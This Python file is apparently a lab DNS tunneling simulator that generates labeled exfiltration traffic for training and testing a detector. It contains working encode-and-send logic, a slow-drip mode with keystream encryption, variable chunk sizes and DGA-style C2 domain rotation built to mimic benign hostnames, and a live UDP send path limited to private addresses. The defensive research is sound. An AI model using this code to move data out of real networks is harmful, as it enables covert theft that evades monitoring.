#!/usr/bin/env python3
"""M10 — adversarial DNS tunneling simulator (lab use only).

Encodes a payload in Base32, splits it into DNS-legal labels under a tunnel
domain, and (optionally) sends the queries as real UDP DNS packets to a
lab-internal target. The pure logic (encode/build/generate) is deterministic
given a seed and needs no network, which is what the evaluation harness and
the unit tests drive.

SAFETY: the send path refuses any --target outside RFC1918/loopback ranges.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import ipaddress
import random
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from exfiltrap import config  # noqa: E402
from exfiltrap.events import DNSQuery, LabeledQuery  # noqa: E402

MODES = ("fast", "slow-drip")

_WORDS = ("report", "saldo", "kernel", "export", "ledger", "schema", "vector",
          "patient", "sensor", "budget", "design", "packet", "metric", "policy")


def make_sample_payload(seed: int = 0, size: int = 3072) -> bytes:
    """Deterministic pseudo-document: mixed text + binary runs.

    Used by BOTH training and evaluation so the drip-label entropy
    distribution is the same family everywhere (an entropy mismatch between
    train and eval payloads silently breaks the comparison).
    """
    rng = random.Random(seed * 7919 + 13)
    out = bytearray()
    while len(out) < size:
        roll = rng.random()
        if roll < 0.55:  # text line
            out += b" ".join(rng.choice(_WORDS).encode()
                             for _ in range(rng.randint(3, 8))) + b"\n"
        elif roll < 0.85:  # key-value / numeric dump
            out += f"{rng.choice(_WORDS)}={rng.randint(0, 65535)};".encode()
        else:  # binary run (compressed/encrypted segment)
            out += rng.randbytes(rng.randint(8, 40))
    return bytes(out[:size])


# Built-in sample "stolen document" for CLI dry-runs: starts with a ZIP
# signature so the decoder's file-signature path is exercisable.
# ASSUMPTION: ~2 KB synthetic sample when --payload-file is not given.
SAMPLE_PAYLOAD = b"PK\x03\x04" + make_sample_payload(0, 2048)


def encode_payload(payload: bytes,
                   chunk_chars: int = config.FAST_LABEL_CHUNK_CHARS) -> list[str]:
    """Base32-encode the payload, then slice into DNS-legal labels.

    Padding '=' is stripped (illegal in hostnames); the detector re-attaches
    it after concatenating the labels of one query.
    """
    if not payload:
        raise ValueError("payload must be non-empty")
    if not 1 <= chunk_chars <= 63:
        raise ValueError("chunk_chars must be within 1..63")
    encoded = base64.b32encode(payload).decode("ascii").rstrip("=")
    return [encoded[i:i + chunk_chars]
            for i in range(0, len(encoded), chunk_chars)]


def build_queries(labels: list[str], base_domain: str = config.TUNNEL_DOMAIN,
                  labels_per_query: int = 3) -> list[str]:
    """Pack encoded labels into qnames (up to ``labels_per_query`` each)."""
    if labels_per_query < 1:
        raise ValueError("labels_per_query must be >= 1")
    queries = []
    for i in range(0, len(labels), labels_per_query):
        group = labels[i:i + labels_per_query]
        qname = ".".join(group + [base_domain])
        if len(qname) > 253:
            raise ValueError(f"qname exceeds 253 chars: {len(qname)}")
        queries.append(qname)
    return queries


def _mode_params(mode: str) -> tuple[float, int, int]:
    """(query_interval, bytes_per_payload_cycle_cap, label_chunk_chars)."""
    if mode == "fast":
        return (config.FAST_QUERY_INTERVAL, config.FAST_LABEL_CHUNK_CHARS,
                config.FAST_BYTES_PER_QUERY)
    if mode == "slow-drip":
        return (config.SLOW_DRIP_QUERY_INTERVAL, config.SLOW_DRIP_LABEL_CHUNK_CHARS,
                config.SLOW_DRIP_BYTES_PER_QUERY)
    raise ValueError(f"unknown mode {mode!r}; expected one of {MODES}")


_C2_TLDS = ("net", "com", "io", "org", "co")


def _make_c2_domains(rng: random.Random, base_domain: str,
                     count: int = 200) -> list[str]:
    """Seeded DGA pool blending into the live 2-label length distribution."""
    lengths = benign_domain_lengths() or [12]
    pool = [base_domain]
    letters = "abcdefghijklmnopqrstuvwxyz"
    for _ in range(count):
        target = rng.choice(lengths)
        tld = rng.choice(_C2_TLDS)
        name_len = max(3, target - len(tld) - 1)
        name = "".join(rng.choices(letters, k=name_len))
        pool.append(f"{name}.{tld}")
    return pool


def benign_domain_lengths() -> list[int]:
    """Lengths of 2-label domains from the bundled corpus (cached)."""
    global _CORPUS_2LABEL_LENGTHS
    if _CORPUS_2LABEL_LENGTHS is None:
        try:
            sys.path.insert(0, str(Path(__file__).resolve().parent))
            lengths = []
            with open(Path(__file__).resolve().parent.parent / "data"
                      / "tranco_top_1m_sample.csv") as fh:
                for line in fh:
                    parts = line.strip().split(",")
                    if len(parts) >= 2 and parts[0].isdigit():
                        d = parts[1]
                        if d.count(".") == 1:
                            lengths.append(len(d))
            _CORPUS_2LABEL_LENGTHS = lengths[:5000] or [12]
        except OSError:
            _CORPUS_2LABEL_LENGTHS = [10, 11, 12, 13, 14, 15]
    return _CORPUS_2LABEL_LENGTHS


_CORPUS_2LABEL_LENGTHS: list[int] | None = None


def generate_traffic(mode: str, payload: bytes, duration: float,
                     start_time: float = 0.0,
                     src_ip: str = config.ATTACKER_IP,
                     seed: int = config.ATTACKER_RANDOM_SEED,
                     base_domain: str = config.TUNNEL_DOMAIN) -> list[LabeledQuery]:
    """Build the full query stream for one attack run (virtual timestamps).

    The payload is sent in cycles; each cycle gets a seeded 4-byte prefix so
    repeats are not byte-identical (a re-send of the same document must still
    look like fresh tunnel traffic, not a loop).

    SLOW-DRIP uses VARIABLE chunk sizes (4..10 raw bytes), ENCRYPTS the
    payload with a per-cycle keystream, and HEX-encodes the result:
    * constant chunk size would leak a constant qname length;
    * base32 sits at the entropy ceiling for its label length, which is
      trivially learnable;
    * hex-of-plaintext has skewed digit statistics (ASCII high-nibble
      clustering) that random hash labels never show.
    Encrypted-then-hexed bytes are uniform over the 16 hex symbols — the
    SAME per-query distribution as benign hash hostnames (CDN cache keys,
    git SHAs). Per-query features are then identical by construction, and
    only per-session accumulation distinguishes the tunnel: a benign client
    emits such labels ~8% of the time, the tunnel on every query.
    """
    interval, chunk_chars, bytes_per_query = _mode_params(mode)
    n_queries = max(1, int(duration / interval))
    rng = random.Random(seed)
    # Rotating 2-label C2 domains (DGA-style) whose LENGTH distribution
    # mirrors the live 2-label domain corpus: a handful of fixed domains
    # would pin qname lengths to a few discrete cells — a joint-distribution
    # artifact any classifier learns instantly. Real DGA authors sample
    # lengths from the population they want to blend into; we do literally
    # that. Domain string content never enters the feature set — only its
    # length and label count do.
    c2_domains = _make_c2_domains(rng, base_domain)

    records: list[LabeledQuery] = []
    chunk_index = 0
    cycle = 0
    while len(records) < n_queries:
        plaintext = rng.randbytes(4) + payload
        if mode == "slow-drip":
            keystream = rng.randbytes(len(plaintext))
            cycle_payload = bytes(a ^ b for a, b in zip(plaintext, keystream))
        else:
            cycle_payload = plaintext
        pos = 0
        while pos < len(cycle_payload) and len(records) < n_queries:
            if mode == "slow-drip":
                size = rng.randint(4, 10)  # -> 8..20 hex chars: same label
            else:                          #    distribution as benign hash
                size = bytes_per_query     #    hostnames, per-query identical
            raw = cycle_payload[pos:pos + size]
            pos += size
            if mode == "slow-drip":
                # Rotate the C2 domain per QUERY: one cycle spans hundreds
                # of queries, so per-cycle rotation would pin every query
                # in realistic runs to a single domain.
                domain = c2_domains[chunk_index % len(c2_domains)]
                qname = f"{binascii.hexlify(raw).decode()}.{domain}"
            else:
                labels = encode_payload(raw, chunk_chars)
                qname = build_queries(labels, base_domain)[0]
            records.append(LabeledQuery(
                query=DNSQuery(src_ip=src_ip, qname=qname,
                               timestamp=start_time + len(records) * interval),
                is_malicious=True,
                meta={"mode": mode, "chunk_index": chunk_index, "cycle": cycle},
            ))
            chunk_index += 1
        cycle += 1
    return records


# ----------------------------------------------------------------------
def _validate_lab_target(target: str) -> None:
    addr = ipaddress.ip_address(target)
    if not (addr.is_private or addr.is_loopback):
        print(f"REFUSING non-lab target {target}: only RFC1918/loopback allowed",
              file=sys.stderr)
        raise SystemExit(2)


def send_queries(records: list[LabeledQuery], target: str, cap: int = 5000,
                 source_ip: str | None = None,
                 port: int = config.DNS_PORT) -> None:
    """Real-time UDP DNS send of a generated stream.

    Sends DNS-MESSAGE bytes through a plain UDP socket and lets the kernel
    add the IP/UDP headers. (Sending a full scapy IP() packet through a UDP
    socket double-wraps it: the detector then dissects the inner header
    bytes as DNS and reads garbage qnames.) ``source_ip`` binds the socket
    so multi-IP labs can separate roles per address.
    """
    _validate_lab_target(target)
    try:
        from scapy.all import DNS, DNSQR
    except ImportError:
        print("scapy is required for live sending: pip install scapy",
              file=sys.stderr)
        raise SystemExit(3)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if source_ip:
        sock.bind((source_ip, 0))
    prev_ts = None
    sent = 0
    try:
        for rec in records[:cap]:
            if prev_ts is not None:
                delay = rec.query.timestamp - prev_ts
                if delay > 0:
                    time.sleep(delay)  # true pacing: a 65s drip sends 65s apart
            msg = bytes(DNS(rd=1, qd=DNSQR(qname=rec.query.qname)))
            sock.sendto(msg, (target, port))
            sent += 1
            prev_ts = rec.query.timestamp
    finally:
        sock.close()
    print(f"sent {sent} tunnel queries to {target}" + 
          (f" from {source_ip}" if source_ip else ""))


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="attacker_client",
        description="DNS tunneling simulator (lab targets only)",
    )
    parser.add_argument("--target", help="lab DNS gateway IP (RFC1918/loopback only)")
    parser.add_argument("--mode", choices=MODES, default="fast")
    parser.add_argument("--duration", type=float, default=60.0,
                        help="seconds of traffic to generate/send")
    parser.add_argument("--source-ip", default=None,
                        help="local address to send from (multi-IP labs)")
    parser.add_argument("--payload-file", type=Path, default=None)
    parser.add_argument("--base-domain", default=config.TUNNEL_DOMAIN)
    parser.add_argument("--seed", type=int, default=config.ATTACKER_RANDOM_SEED)
    args = parser.parse_args(argv)

    payload = (args.payload_file.read_bytes() if args.payload_file
               and args.payload_file.exists() else SAMPLE_PAYLOAD)
    records = generate_traffic(args.mode, payload, args.duration,
                               seed=args.seed, base_domain=args.base_domain)

    if args.target:
        send_queries(records, args.target, source_ip=args.source_ip)
    else:
        print(f"dry-run ({args.mode}, {args.duration:.0f}s, "
              f"payload {len(payload)} bytes -> {len(records)} queries):")
        for rec in records[:5]:
            print(f"  t={rec.query.timestamp:9.2f}  {rec.query.qname}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
